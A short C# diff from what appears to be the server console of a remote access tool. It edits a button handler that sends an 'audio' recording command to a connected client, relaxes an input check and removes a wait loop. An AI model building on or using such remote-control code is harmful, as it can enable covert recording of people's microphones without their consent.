@@ -33,7 +33,7 @@ namespace Server.Forms
         //Start or stop audio recording
         private void btnStartStopRecord_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text != null&& textBox1.Text != "")
+            if (textBox1.Text != null)
             {
                 MsgPack packet = new MsgPack();
                 packet.ForcePathObject("Pac_ket").AsString = "audio";
@@ -46,15 +46,7 @@ namespace Server.Forms
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 Thread.Sleep(100);
                 btnStartStopRecord.Text = "Wait...";
-                btnStartStopRecord.Enabled = false;
-                DateTime dt1 = DateTime.Now;
-                int timetosleep = Convert.ToInt32(textBox1.Text) * 1000;
-                while ((DateTime.Now - dt1).TotalMilliseconds < timetosleep)
-                {
-                    continue;
-                };
-                btnStartStopRecord.Text = "Start Recording";
-                btnStartStopRecord.Enabled = true;
+                btnStartStopRecord.Enabled = false;                
             }
             else
             {
